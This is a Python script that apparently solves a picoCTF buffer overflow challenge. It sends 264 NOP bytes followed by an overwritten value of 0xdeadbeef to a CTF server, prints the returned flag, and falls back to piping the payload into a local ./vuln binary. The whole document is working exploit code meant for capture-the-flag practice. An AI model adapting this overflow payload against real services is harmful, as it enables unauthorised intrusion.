import base64
import socket
import os

host = "mars.picoctf.net"
port = 31890
nop = b'\x90' * 264
ret = b'\xef\xbe\xad\xde' #0xdeadbeef
stack = nop + ret

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
    try:
        client.connect((host, port))
        print(f"[+] connect {host}:{port}")
        banner = client.recv(2048)
        client.send(stack + b'\n\r')
        print(f"[+] send payload --> {stack}")
        client.recv(2048)
        flag = client.recv(2048)
        print(flag.decode("utf-8"))

    except:
        payload = base64.b64encode(stack).decode("utf-8")
        os.system(f'(echo {payload} | base64 -d) | ./vuln')
